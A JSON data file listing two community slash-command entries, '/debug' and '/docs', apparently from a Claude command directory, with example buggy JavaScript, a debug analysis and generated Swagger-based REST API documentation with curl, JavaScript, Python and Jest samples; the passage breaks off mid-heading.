{
  "commands": [
    {
      "title": "/debug",
      "description": "Advanced debugging assistant with root cause analysis, step-by-step troubleshooting, and automated fix suggestions",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "debugging",
        "troubleshooting",
        "error-analysis",
        "diagnostics",
        "fixes"
      ],
      "content": "The `/debug` command provides intelligent debugging assistance with root cause analysis, systematic troubleshooting, performance profiling, and automated fix generation for various programming languages and frameworks.\\n\\n## Usage\\n\\n```\\n/debug [options] <error_or_file>\\n```\\n\\n## Options\\n\\n### Debug Modes\\n- `--interactive` - Step-by-step guided debugging\\n- `--automated` - Automatic issue detection and fixes\\n- `--analysis` - Deep code analysis without fixes\\n- `--performance` - Performance bottleneck identification\\n\\n### Error Types\\n- `--runtime` - Runtime errors and exceptions\\n- `--logic` - Logic errors and unexpected behavior\\n- `--memory` - Memory leaks and allocation issues\\n- `--network` - Network and API related problems\\n- `--database` - Database connection and query issues\\n\\n### Scope Options\\n- `--function` - Debug specific function\\n- `--class` - Debug entire class\\n- `--module` - Debug module/file\\n- `--system` - System-wide debugging\\n\\n### Output Formats\\n- `--format=detailed` - Comprehensive analysis (default)\\n- `--format=quick` - Quick diagnosis and fix\\n- `--format=checklist` - Debugging checklist\\n- `--format=trace` - Execution trace analysis\\n\\n## Examples\\n\\n### Runtime Error Debugging\\n\\n```javascript\\n// Problematic code with multiple issues\\nconst UserManager = {\\n  users: [],\\n  \\n  async addUser(userData) {\\n    // üêõ Bug 1: No input validation\\n    const user = {\\n      id: this.users.length + 1, // üêõ Bug 2: Race condition possible\\n      name: userData.name,\\n      email: userData.email,\\n      createdAt: new Date()\\n    };\\n    \\n    // üêõ Bug 3: Async operation without proper error handling\\n    const result = await fetch('/api/users', {\\n      method: 'POST',\\n      body: JSON.stringify(user) // üêõ Bug 4: Missing Content-Type header\\n    });\\n    \\n    // üêõ Bug 5: No response status check\\n    const savedUser = await result.json();\\n    \\n    this.users.push(savedUser);\\n    return savedUser;\\n  },\\n  \\n  findUserByEmail(email) {\\n    // üêõ Bug 6: Case-sensitive search\\n    return this.users.find(user => user.email === email);\\n  },\\n  \\n  deleteUser(userId) {\\n    // üêõ Bug 7: Modifying array while iterating\\n    for (let i = 0; i < this.users.length; i++) {\\n      if (this.users[i].id === userId) {\\n        this.users.splice(i, 1);\\n        break;\\n      }\\n    }\\n  }\\n};\\n\\n// Error scenario\\nUserManager.addUser({ name: \\\"John\\\" }) // Missing email\\n  .then(user => console.log('Added:', user))\\n  .catch(error => console.error('Error:', error)); // üêõ Error not properly caught\\n```\\n\\n**Debug Analysis Output:**\\n\\n```markdown\\n# üêõ Debug Analysis: UserManager\\n\\n## üö® Critical Issues Found (7)\\n\\n### Issue 1: Missing Input Validation\\n**Location:** Line 5 - `addUser` method\\n**Severity:** High\\n**Type:** Runtime Error\\n\\n**Problem:**\\n```javascript\\n// Current code (vulnerable)\\nconst user = {\\n  id: this.users.length + 1,\\n  name: userData.name,     // ‚ùå Could be undefined\\n  email: userData.email,   // ‚ùå Could be undefined\\n  createdAt: new Date()\\n};\\n```\\n\\n**Error Symptoms:**\\n- `TypeError: Cannot read property 'name' of undefined`\\n- Silent failures with incomplete data\\n- Database constraint violations\\n\\n**Root Cause:**\\nNo validation of input parameters allows undefined/null values to propagate through the system.\\n\\n**Fix:**\\n```javascript\\nasync addUser(userData) {\\n  // Input validation\\n  if (!userData || typeof userData !== 'object') {\\n    throw new Error('Invalid user data: expected object');\\n  }\\n  \\n  const required = ['name', 'email'];\\n  const missing = required.filter(field => !userData[field]);\\n  \\n  if (missing.length > 0) {\\n    throw new Error(`Missing required fields: ${missing.join(', ')}`);\\n  }\\n  \\n  // Email format validation\\n  const emailRegex = /^[^\\\\s@]+@[^\\\\s@]+\\\\.[^\\\\s@]+$/;\\n  if (!emailRegex.test(userData.email)) {\\n    throw new Error('Invalid email format');\\n  }\\n  \\n  // Continue with validated data...\\n}\\n```\\n\\n### Issue 2: Race Condition in ID Generation\\n**Location:** Line 6\\n**Severity:** High\\n**Type:** Logic Error\\n\\n**Problem:**\\n```javascript\\nid: this.users.length + 1, // ‚ùå Not thread-safe\\n```\\n\\n**Race Condition Scenario:**\\n```\\nThread A: reads length = 5, calculates id = 6\\nThread B: reads length = 5, calculates id = 6\\nThread A: adds user with id = 6\\nThread B: adds user with id = 6 (DUPLICATE!)\\n```\\n\\n**Fix Options:**\\n\\n**Option 1: UUID (Recommended)**\\n```javascript\\nconst { v4: uuidv4 } = require('uuid');\\n\\nconst user = {\\n  id: uuidv4(), // ‚úÖ Guaranteed unique\\n  name: userData.name,\\n  email: userData.email,\\n  createdAt: new Date()\\n};\\n```\\n\\n**Option 2: Atomic Counter**\\n```javascript\\nclass UserManager {\\n  constructor() {\\n    this.users = [];\\n    this.nextId = 1;\\n  }\\n  \\n  generateId() {\\n    return this.nextId++; // ‚úÖ Atomic increment\\n  }\\n}\\n```\\n\\nThis debugging analysis demonstrates systematic problem identification, root cause analysis, and comprehensive solution implementation with prevention strategies.",
      "configuration": {
        "temperature": 0.2,
        "maxTokens": 12000,
        "systemPrompt": "You are an expert code reviewer with deep knowledge of security, performance, and best practices across multiple programming languages. Provide comprehensive, actionable feedback with specific examples and fixes."
      },
      "githubUrl": "https://github.com/claudepro/code-reviewer",
      "documentationUrl": "https://docs.claude.ai/commands/debug",
      "source": "community",
      "slug": "debug",
      "type": "command",
      "url": "https://claudepro.directory/commands/debug"
    },
    {
      "title": "/docs",
      "description": "Intelligent documentation generator with API specs, code examples, tutorials, and interactive guides",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "documentation",
        "api-docs",
        "tutorials",
        "guides",
        "markdown"
      ],
      "content": "The `/docs` command automatically generates comprehensive documentation including API specifications, code examples, tutorials, user guides, and interactive documentation with live examples.\n\n## Usage\n\n```\n/docs [options] <file_or_project>\n```\n\n## Options\n\n### Documentation Types\n- `--api` - Generate API documentation (OpenAPI/Swagger)\n- `--code` - Code documentation with JSDoc/docstrings\n- `--user` - User guides and tutorials\n- `--developer` - Developer documentation and architecture\n- `--readme` - Project README and getting started guide\n- `--all` - Comprehensive documentation suite (default)\n\n### Output Formats\n- `--format=markdown` - Markdown documentation (default)\n- `--format=html` - Static HTML documentation\n- `--format=interactive` - Interactive documentation with examples\n- `--format=pdf` - PDF documentation for distribution\n- `--format=confluence` - Confluence wiki format\n\n### Documentation Features\n- `--examples` - Include runnable code examples\n- `--tutorials` - Generate step-by-step tutorials\n- `--diagrams` - Generate architecture and flow diagrams\n- `--interactive` - Create interactive API explorer\n- `--multilingual` - Generate documentation in multiple languages\n\n### Customization\n- `--template=default` - Use default documentation template\n- `--template=minimal` - Minimal documentation template\n- `--template=enterprise` - Enterprise documentation template\n- `--brand=company` - Apply company branding and styling\n\n## Examples\n\n### API Documentation Generation\n\n```javascript\n// Express.js API with comprehensive documentation\nconst express = require('express');\nconst swaggerJsdoc = require('swagger-jsdoc');\nconst swaggerUi = require('swagger-ui-express');\n\nconst app = express();\n\n/**\n * @swagger\n * components:\n *   schemas:\n *     User:\n *       type: object\n *       required:\n *         - name\n *         - email\n *       properties:\n *         id:\n *           type: string\n *           format: uuid\n *           description: Unique identifier for the user\n *           example: \"123e4567-e89b-12d3-a456-426614174000\"\n *         name:\n *           type: string\n *           minLength: 2\n *           maxLength: 100\n *           description: User's full name\n *           example: \"John Doe\"\n *         email:\n *           type: string\n *           format: email\n *           description: User's email address\n *           example: \"john.doe@example.com\"\n *         age:\n *           type: integer\n *           minimum: 13\n *           maximum: 120\n *           description: User's age in years\n *           example: 30\n *         role:\n *           type: string\n *           enum: [user, admin, moderator]\n *           description: User's role in the system\n *           example: \"user\"\n *         createdAt:\n *           type: string\n *           format: date-time\n *           description: User creation timestamp\n *           example: \"2025-09-16T10:30:00Z\"\n *         updatedAt:\n *           type: string\n *           format: date-time\n *           description: Last update timestamp\n *           example: \"2025-09-16T14:45:00Z\"\n *       example:\n *         id: \"123e4567-e89b-12d3-a456-426614174000\"\n *         name: \"John Doe\"\n *         email: \"john.doe@example.com\"\n *         age: 30\n *         role: \"user\"\n *         createdAt: \"2025-09-16T10:30:00Z\"\n *         updatedAt: \"2025-09-16T14:45:00Z\"\n *   \n *     UserInput:\n *       type: object\n *       required:\n *         - name\n *         - email\n *       properties:\n *         name:\n *           type: string\n *           minLength: 2\n *           maxLength: 100\n *           description: User's full name\n *         email:\n *           type: string\n *           format: email\n *           description: User's email address\n *         age:\n *           type: integer\n *           minimum: 13\n *           maximum: 120\n *           description: User's age in years\n *   \n *     Error:\n *       type: object\n *       properties:\n *         error:\n *           type: string\n *           description: Error message\n *         code:\n *           type: string\n *           description: Error code\n *         details:\n *           type: object\n *           description: Additional error details\n *       example:\n *         error: \"Validation failed\"\n *         code: \"VALIDATION_ERROR\"\n *         details:\n *           field: \"email\"\n *           message: \"Invalid email format\"\n *   \n *   responses:\n *     NotFound:\n *       description: Resource not found\n *       content:\n *         application/json:\n *           schema:\n *             $ref: '#/components/schemas/Error'\n *           example:\n *             error: \"User not found\"\n *             code: \"USER_NOT_FOUND\"\n *     ValidationError:\n *       description: Validation error\n *       content:\n *         application/json:\n *           schema:\n *             $ref: '#/components/schemas/Error'\n *     ServerError:\n *       description: Internal server error\n *       content:\n *         application/json:\n *           schema:\n *             $ref: '#/components/schemas/Error'\n *   \n *   securitySchemes:\n *     bearerAuth:\n *       type: http\n *       scheme: bearer\n *       bearerFormat: JWT\n */\n\n/**\n * @swagger\n * /api/users:\n *   get:\n *     summary: Get all users\n *     description: |\n *       Retrieve a paginated list of all users in the system.\n *       \n *       ## Features\n *       - Pagination support with configurable page size\n *       - Filtering by role, status, and creation date\n *       - Sorting by multiple fields\n *       - Search functionality across name and email\n *       \n *       ## Usage Examples\n *       \n *       ### Basic usage\n *       ```\n *       GET /api/users\n *       ```\n *       \n *       ### With pagination\n *       ```\n *       GET /api/users?page=2&limit=20\n *       ```\n *       \n *       ### With filtering\n *       ```\n *       GET /api/users?role=admin&status=active\n *       ```\n *       \n *       ### With search\n *       ```\n *       GET /api/users?search=john&sort=name:asc\n *       ```\n *     tags: [Users]\n *     security:\n *       - bearerAuth: []\n *     parameters:\n *       - in: query\n *         name: page\n *         schema:\n *           type: integer\n *           minimum: 1\n *           default: 1\n *         description: Page number for pagination\n *         example: 1\n *       - in: query\n *         name: limit\n *         schema:\n *           type: integer\n *           minimum: 1\n *           maximum: 100\n *           default: 20\n *         description: Number of users per page\n *         example: 20\n *       - in: query\n *         name: search\n *         schema:\n *           type: string\n *           maxLength: 100\n *         description: Search term for name or email\n *         example: \"john\"\n *       - in: query\n *         name: role\n *         schema:\n *           type: string\n *           enum: [user, admin, moderator]\n *         description: Filter by user role\n *         example: \"user\"\n *       - in: query\n *         name: status\n *         schema:\n *           type: string\n *           enum: [active, inactive, suspended]\n *         description: Filter by user status\n *         example: \"active\"\n *       - in: query\n *         name: sort\n *         schema:\n *           type: string\n *           pattern: '^(name|email|createdAt|updatedAt):(asc|desc)$'\n *         description: Sort field and direction\n *         example: \"name:asc\"\n *     responses:\n *       200:\n *         description: List of users retrieved successfully\n *         content:\n *           application/json:\n *             schema:\n *               type: object\n *               properties:\n *                 users:\n *                   type: array\n *                   items:\n *                     $ref: '#/components/schemas/User'\n *                 pagination:\n *                   type: object\n *                   properties:\n *                     page:\n *                       type: integer\n *                       example: 1\n *                     limit:\n *                       type: integer\n *                       example: 20\n *                     total:\n *                       type: integer\n *                       example: 150\n *                     totalPages:\n *                       type: integer\n *                       example: 8\n *                     hasNext:\n *                       type: boolean\n *                       example: true\n *                     hasPrev:\n *                       type: boolean\n *                       example: false\n *             examples:\n *               success:\n *                 summary: Successful response\n *                 value:\n *                   users:\n *                     - id: \"123e4567-e89b-12d3-a456-426614174000\"\n *                       name: \"John Doe\"\n *                       email: \"john.doe@example.com\"\n *                       age: 30\n *                       role: \"user\"\n *                       createdAt: \"2025-09-16T10:30:00Z\"\n *                       updatedAt: \"2025-09-16T14:45:00Z\"\n *                     - id: \"456e7890-e89b-12d3-a456-426614174001\"\n *                       name: \"Jane Smith\"\n *                       email: \"jane.smith@example.com\"\n *                       age: 28\n *                       role: \"admin\"\n *                       createdAt: \"2025-09-15T09:15:00Z\"\n *                       updatedAt: \"2025-09-16T11:20:00Z\"\n *                   pagination:\n *                     page: 1\n *                     limit: 20\n *                     total: 150\n *                     totalPages: 8\n *                     hasNext: true\n *                     hasPrev: false\n *       401:\n *         description: Unauthorized - Invalid or missing authentication token\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n *             example:\n *               error: \"Authentication required\"\n *               code: \"UNAUTHORIZED\"\n *       403:\n *         description: Forbidden - Insufficient permissions\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n *             example:\n *               error: \"Insufficient permissions\"\n *               code: \"FORBIDDEN\"\n *       500:\n *         $ref: '#/components/responses/ServerError'\n *   \n *   post:\n *     summary: Create a new user\n *     description: |\n *       Create a new user account in the system.\n *       \n *       ## Validation Rules\n *       - Name must be 2-100 characters long\n *       - Email must be unique and valid format\n *       - Age must be between 13-120 (if provided)\n *       - Password must meet complexity requirements\n *       \n *       ## Business Logic\n *       - New users are created with 'user' role by default\n *       - Email verification is sent upon creation\n *       - Account is initially inactive until email verification\n *       \n *       ## Rate Limiting\n *       - Maximum 5 user creations per hour per IP\n *       - Additional restrictions for automated requests\n *     tags: [Users]\n *     security:\n *       - bearerAuth: []\n *     requestBody:\n *       required: true\n *       content:\n *         application/json:\n *           schema:\n *             $ref: '#/components/schemas/UserInput'\n *           examples:\n *             basic:\n *               summary: Basic user creation\n *               value:\n *                 name: \"Alice Johnson\"\n *                 email: \"alice.johnson@example.com\"\n *                 age: 25\n *             minimal:\n *               summary: Minimal required fields\n *               value:\n *                 name: \"Bob Wilson\"\n *                 email: \"bob.wilson@example.com\"\n *     responses:\n *       201:\n *         description: User created successfully\n *         content:\n *           application/json:\n *             schema:\n *               type: object\n *               properties:\n *                 user:\n *                   $ref: '#/components/schemas/User'\n *                 message:\n *                   type: string\n *                   example: \"User created successfully\"\n *             example:\n *               user:\n *                 id: \"789e0123-e89b-12d3-a456-426614174002\"\n *                 name: \"Alice Johnson\"\n *                 email: \"alice.johnson@example.com\"\n *                 age: 25\n *                 role: \"user\"\n *                 createdAt: \"2025-09-16T15:30:00Z\"\n *                 updatedAt: \"2025-09-16T15:30:00Z\"\n *               message: \"User created successfully\"\n *       400:\n *         $ref: '#/components/responses/ValidationError'\n *       401:\n *         description: Unauthorized\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n *       409:\n *         description: Conflict - Email already exists\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n *             example:\n *               error: \"Email already exists\"\n *               code: \"EMAIL_EXISTS\"\n *       500:\n *         $ref: '#/components/responses/ServerError'\n */\napp.get('/api/users', async (req, res) => {\n  // Implementation here...\n});\n\napp.post('/api/users', async (req, res) => {\n  // Implementation here...\n});\n\n/**\n * @swagger\n * /api/users/{id}:\n *   get:\n *     summary: Get user by ID\n *     description: |\n *       Retrieve a specific user by their unique identifier.\n *       \n *       ## Access Control\n *       - Users can only access their own profile\n *       - Admins can access any user profile\n *       - Moderators can access non-admin user profiles\n *       \n *       ## Data Privacy\n *       - Sensitive fields are filtered based on access level\n *       - Full profile data only available to user themselves or admins\n *     tags: [Users]\n *     security:\n *       - bearerAuth: []\n *     parameters:\n *       - in: path\n *         name: id\n *         required: true\n *         schema:\n *           type: string\n *           format: uuid\n *         description: User ID\n *         example: \"123e4567-e89b-12d3-a456-426614174000\"\n *     responses:\n *       200:\n *         description: User found\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/User'\n *       404:\n *         $ref: '#/components/responses/NotFound'\n *       403:\n *         description: Forbidden - Cannot access this user\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n *   \n *   put:\n *     summary: Update user\n *     description: |\n *       Update an existing user's information.\n *       \n *       ## Update Rules\n *       - Users can only update their own profile\n *       - Admins can update any user profile\n *       - Email changes require verification\n *       - Role changes restricted to admins\n *     tags: [Users]\n *     security:\n *       - bearerAuth: []\n *     parameters:\n *       - in: path\n *         name: id\n *         required: true\n *         schema:\n *           type: string\n *           format: uuid\n *         description: User ID\n *     requestBody:\n *       required: true\n *       content:\n *         application/json:\n *           schema:\n *             $ref: '#/components/schemas/UserInput'\n *     responses:\n *       200:\n *         description: User updated successfully\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/User'\n *       400:\n *         $ref: '#/components/responses/ValidationError'\n *       404:\n *         $ref: '#/components/responses/NotFound'\n *       403:\n *         description: Forbidden\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n *   \n *   delete:\n *     summary: Delete user\n *     description: |\n *       Delete a user account from the system.\n *       \n *       ## Deletion Policy\n *       - Soft delete by default (marks as inactive)\n *       - Hard delete requires admin privileges and confirmation\n *       - Associated data is anonymized or removed\n *       - Action is irreversible and logged for audit\n *     tags: [Users]\n *     security:\n *       - bearerAuth: []\n *     parameters:\n *       - in: path\n *         name: id\n *         required: true\n *         schema:\n *           type: string\n *           format: uuid\n *         description: User ID\n *       - in: query\n *         name: hard\n *         schema:\n *           type: boolean\n *           default: false\n *         description: Perform hard delete (admin only)\n *     responses:\n *       200:\n *         description: User deleted successfully\n *         content:\n *           application/json:\n *             schema:\n *               type: object\n *               properties:\n *                 message:\n *                   type: string\n *                   example: \"User deleted successfully\"\n *                 deletedAt:\n *                   type: string\n *                   format: date-time\n *                   example: \"2025-09-16T16:00:00Z\"\n *       404:\n *         $ref: '#/components/responses/NotFound'\n *       403:\n *         description: Forbidden\n *         content:\n *           application/json:\n *             schema:\n *               $ref: '#/components/schemas/Error'\n */\napp.get('/api/users/:id', async (req, res) => {\n  // Implementation here...\n});\n\napp.put('/api/users/:id', async (req, res) => {\n  // Implementation here...\n});\n\napp.delete('/api/users/:id', async (req, res) => {\n  // Implementation here...\n});\n```\n\n**Generated API Documentation:**\n\n```markdown\n# User Management API Documentation\n\n## Overview\n\nThe User Management API provides comprehensive functionality for managing user accounts, authentication, and user-related operations. This RESTful API follows OpenAPI 3.0 specifications and includes robust error handling, validation, and security features.\n\n### Base URL\n```\nhttps://api.example.com/v1\n```\n\n### Authentication\nAll API endpoints require authentication using JWT Bearer tokens:\n\n```bash\nAuthorization: Bearer <your-jwt-token>\n```\n\n### Rate Limiting\n- **Standard endpoints**: 100 requests per 15 minutes\n- **Authentication endpoints**: 5 requests per 15 minutes\n- **User creation**: 5 requests per hour\n\n### Response Format\nAll responses are in JSON format with consistent error handling:\n\n```json\n{\n  \"data\": {},\n  \"message\": \"Success\",\n  \"timestamp\": \"2025-09-16T10:30:00Z\"\n}\n```\n\n## Quick Start\n\n### 1. Authentication\nFirst, obtain an authentication token:\n\n```bash\ncurl -X POST https://api.example.com/v1/auth/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"user@example.com\",\n    \"password\": \"your-password\"\n  }'\n```\n\n**Response:**\n```json\n{\n  \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\n  \"expiresIn\": 3600,\n  \"user\": {\n    \"id\": \"123e4567-e89b-12d3-a456-426614174000\",\n    \"name\": \"John Doe\",\n    \"email\": \"user@example.com\",\n    \"role\": \"user\"\n  }\n}\n```\n\n### 2. Get All Users\nRetrieve a list of users with pagination:\n\n```bash\ncurl -X GET \"https://api.example.com/v1/api/users?page=1&limit=20\" \\\n  -H \"Authorization: Bearer <your-token>\"\n```\n\n### 3. Create a New User\n```bash\ncurl -X POST https://api.example.com/v1/api/users \\\n  -H \"Authorization: Bearer <your-token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"Alice Johnson\",\n    \"email\": \"alice@example.com\",\n    \"age\": 25\n  }'\n```\n\n### 4. Update User Information\n```bash\ncurl -X PUT https://api.example.com/v1/api/users/123e4567-e89b-12d3-a456-426614174000 \\\n  -H \"Authorization: Bearer <your-token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"Alice Johnson-Smith\",\n    \"age\": 26\n  }'\n```\n\n## Code Examples\n\n### JavaScript/Node.js\n\n```javascript\nconst axios = require('axios');\n\nclass UserAPIClient {\n  constructor(baseURL, token) {\n    this.client = axios.create({\n      baseURL,\n      headers: {\n        'Authorization': `Bearer ${token}`,\n        'Content-Type': 'application/json'\n      }\n    });\n  }\n  \n  async getUsers(params = {}) {\n    try {\n      const response = await this.client.get('/api/users', { params });\n      return response.data;\n    } catch (error) {\n      throw this.handleError(error);\n    }\n  }\n  \n  async createUser(userData) {\n    try {\n      const response = await this.client.post('/api/users', userData);\n      return response.data;\n    } catch (error) {\n      throw this.handleError(error);\n    }\n  }\n  \n  async getUserById(id) {\n    try {\n      const response = await this.client.get(`/api/users/${id}`);\n      return response.data;\n    } catch (error) {\n      throw this.handleError(error);\n    }\n  }\n  \n  handleError(error) {\n    if (error.response) {\n      // Server responded with error status\n      const { status, data } = error.response;\n      return new Error(`API Error ${status}: ${data.error || data.message}`);\n    } else if (error.request) {\n      // Network error\n      return new Error('Network error: Unable to reach API');\n    } else {\n      // Other error\n      return new Error(`Request error: ${error.message}`);\n    }\n  }\n}\n\n// Usage example\nconst userAPI = new UserAPIClient('https://api.example.com/v1', 'your-jwt-token');\n\n// Get paginated users\nconst users = await userAPI.getUsers({ page: 1, limit: 20, role: 'user' });\nconsole.log('Users:', users);\n\n// Create new user\nconst newUser = await userAPI.createUser({\n  name: 'Bob Wilson',\n  email: 'bob@example.com',\n  age: 30\n});\nconsole.log('Created user:', newUser);\n```\n\n### Python\n\n```python\nimport requests\nimport json\nfrom typing import Dict, List, Optional\n\nclass UserAPIClient:\n    def __init__(self, base_url: str, token: str):\n        self.base_url = base_url\n        self.session = requests.Session()\n        self.session.headers.update({\n            'Authorization': f'Bearer {token}',\n            'Content-Type': 'application/json'\n        })\n    \n    def get_users(self, page: int = 1, limit: int = 20, **filters) -> Dict:\n        \"\"\"Get paginated list of users with optional filters.\"\"\"\n        params = {'page': page, 'limit': limit, **filters}\n        response = self.session.get(f'{self.base_url}/api/users', params=params)\n        response.raise_for_status()\n        return response.json()\n    \n    def create_user(self, user_data: Dict) -> Dict:\n        \"\"\"Create a new user.\"\"\"\n        response = self.session.post(\n            f'{self.base_url}/api/users',\n            json=user_data\n        )\n        response.raise_for_status()\n        return response.json()\n    \n    def get_user_by_id(self, user_id: str) -> Dict:\n        \"\"\"Get user by ID.\"\"\"\n        response = self.session.get(f'{self.base_url}/api/users/{user_id}')\n        response.raise_for_status()\n        return response.json()\n    \n    def update_user(self, user_id: str, updates: Dict) -> Dict:\n        \"\"\"Update user information.\"\"\"\n        response = self.session.put(\n            f'{self.base_url}/api/users/{user_id}',\n            json=updates\n        )\n        response.raise_for_status()\n        return response.json()\n    \n    def delete_user(self, user_id: str, hard_delete: bool = False) -> Dict:\n        \"\"\"Delete user (soft delete by default).\"\"\"\n        params = {'hard': hard_delete} if hard_delete else {}\n        response = self.session.delete(\n            f'{self.base_url}/api/users/{user_id}',\n            params=params\n        )\n        response.raise_for_status()\n        return response.json()\n\n# Usage example\nuser_api = UserAPIClient('https://api.example.com/v1', 'your-jwt-token')\n\n# Get users with filters\nusers = user_api.get_users(page=1, limit=10, role='admin', status='active')\nprint(f\"Found {users['pagination']['total']} users\")\n\n# Create user\nnew_user = user_api.create_user({\n    'name': 'Carol Davis',\n    'email': 'carol@example.com',\n    'age': 28\n})\nprint(f\"Created user: {new_user['user']['id']}\")\n```\n\n### curl Examples\n\n```bash\n#!/bin/bash\n\n# Set base URL and token\nBASE_URL=\"https://api.example.com/v1\"\nTOKEN=\"your-jwt-token\"\n\n# Get all users with pagination\necho \"Getting users...\"\ncurl -s -X GET \"$BASE_URL/api/users?page=1&limit=5\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  | jq '.users[] | {id, name, email, role}'\n\n# Create a new user\necho \"Creating user...\"\nNEW_USER=$(curl -s -X POST \"$BASE_URL/api/users\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"David Miller\",\n    \"email\": \"david@example.com\",\n    \"age\": 35\n  }')\n\nUSER_ID=$(echo $NEW_USER | jq -r '.user.id')\necho \"Created user with ID: $USER_ID\"\n\n# Get the created user\necho \"Getting created user...\"\ncurl -s -X GET \"$BASE_URL/api/users/$USER_ID\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  | jq '{id, name, email, createdAt}'\n\n# Update the user\necho \"Updating user...\"\ncurl -s -X PUT \"$BASE_URL/api/users/$USER_ID\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"David Miller Jr.\",\n    \"age\": 36\n  }' \\\n  | jq '{id, name, age, updatedAt}'\n\n# Search users\necho \"Searching users...\"\ncurl -s -X GET \"$BASE_URL/api/users?search=david&sort=name:asc\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  | jq '.users[] | {name, email}'\n```\n\n## Error Handling\n\n### Error Response Format\nAll errors follow a consistent format:\n\n```json\n{\n  \"error\": \"Human-readable error message\",\n  \"code\": \"MACHINE_READABLE_ERROR_CODE\",\n  \"details\": {\n    \"field\": \"Additional context\",\n    \"value\": \"Problematic value\"\n  },\n  \"timestamp\": \"2025-09-16T10:30:00Z\",\n  \"requestId\": \"req_123456789\"\n}\n```\n\n### Common Error Codes\n\n| Status Code | Error Code | Description | Action |\n|-------------|------------|-------------|--------|\n| 400 | `VALIDATION_ERROR` | Request validation failed | Check request format and required fields |\n| 401 | `UNAUTHORIZED` | Authentication required | Provide valid JWT token |\n| 403 | `FORBIDDEN` | Insufficient permissions | Check user role and permissions |\n| 404 | `USER_NOT_FOUND` | User does not exist | Verify user ID |\n| 409 | `EMAIL_EXISTS` | Email already registered | Use different email address |\n| 429 | `RATE_LIMIT_EXCEEDED` | Too many requests | Wait before retrying |\n| 500 | `INTERNAL_ERROR` | Server error | Contact support if persistent |\n\n### Error Handling Best Practices\n\n```javascript\n// Comprehensive error handling example\nasync function handleUserOperation(apiCall) {\n  try {\n    const result = await apiCall();\n    return { success: true, data: result };\n  } catch (error) {\n    const errorInfo = {\n      success: false,\n      error: error.message,\n      code: error.code,\n      timestamp: new Date().toISOString()\n    };\n    \n    // Log error for debugging\n    console.error('API Error:', errorInfo);\n    \n    // Handle specific error types\n    switch (error.response?.status) {\n      case 400:\n        return { ...errorInfo, userMessage: 'Please check your input and try again.' };\n      case 401:\n        return { ...errorInfo, userMessage: 'Please log in again.', requiresAuth: true };\n      case 403:\n        return { ...errorInfo, userMessage: 'You don\\'t have permission for this action.' };\n      case 404:\n        return { ...errorInfo, userMessage: 'The requested user was not found.' };\n      case 409:\n        return { ...errorInfo, userMessage: 'This email is already registered.' };\n      case 429:\n        return { ...errorInfo, userMessage: 'Too many requests. Please try again later.', retryAfter: 60 };\n      case 500:\n        return { ...errorInfo, userMessage: 'Server error. Please try again or contact support.' };\n      default:\n        return { ...errorInfo, userMessage: 'An unexpected error occurred.' };\n    }\n  }\n}\n\n// Usage\nconst result = await handleUserOperation(() => userAPI.createUser(userData));\nif (result.success) {\n  console.log('User created:', result.data);\n} else {\n  showErrorMessage(result.userMessage);\n  if (result.requiresAuth) {\n    redirectToLogin();\n  }\n}\n```\n\n## SDKs and Libraries\n\n### Official SDKs\n- **JavaScript/TypeScript**: `npm install @example/user-api-client`\n- **Python**: `pip install example-user-api`\n- **Go**: `go get github.com/example/user-api-go`\n- **PHP**: `composer require example/user-api-php`\n\n### Community Libraries\n- **Ruby**: [user-api-ruby](https://github.com/community/user-api-ruby)\n- **Java**: [user-api-java](https://github.com/community/user-api-java)\n- **C#**: [UserApi.NET](https://github.com/community/user-api-dotnet)\n\n## Testing\n\n### Postman Collection\nDownload our [Postman collection](https://api.example.com/postman/user-api.json) with pre-configured requests and environment variables.\n\n### Test Data\nUse our test environment with sample data:\n- **Base URL**: `https://api-test.example.com/v1`\n- **Test Token**: Contact support for test credentials\n\n### Example Test Cases\n\n```javascript\n// Jest test examples\ndescribe('User API', () => {\n  let userAPI;\n  let testUserId;\n  \n  beforeAll(() => {\n    userAPI = new UserAPIClient(\n      process.env.TEST_API_URL,\n      process.env.TEST_API_TOKEN\n    );\n  });\n  \n  test('should create a new user', async () => {\n    const userData = {\n      name: 'Test User',\n      email: `test-${Date.now()}@example.com`,\n      age: 25\n    };\n    \n    const result = await userAPI.createUser(userData);\n    \n    expect(result.user).toMatchObject({\n      name: userData.name,\n      email: userData.email,\n      age: userData.age,\n      role: 'user'\n    });\n    expect(result.user.id).toBeDefined();\n    \n    testUserId = result.user.id;\n  });\n  \n  test('should get user by ID', async () => {\n    const user = await userAPI.getUserById(testUserId);\n    \n    expect(user.id).toBe(testUserId);\n    expect(user.name).toBe('Test User');\n  });\n  \n  test('should update user information', async () => {\n    const updates = { name: 'Updated Test User', age: 26 };\n    const updatedUser = await userAPI.updateUser(testUserId, updates);\n    \n    expect(updatedUser.name).toBe(updates.name);\n    expect(updatedUser.age).toBe(updates.age);\n  });\n  \n  test('should handle validation errors', async () => {\n    const invalidData = { name: '', email: 'invalid-email' };\n    \n    await expect(userAPI.createUser(invalidData))\n      .rejects.toThrow(/validation/i);\n  });\n  \n  afterAll(async () => {\n    if (testUserId) {\n      await userAPI.deleteUser(testUserId, true); // Hard delete test user\n    }\n  });\n});\n```\n\n## Support and 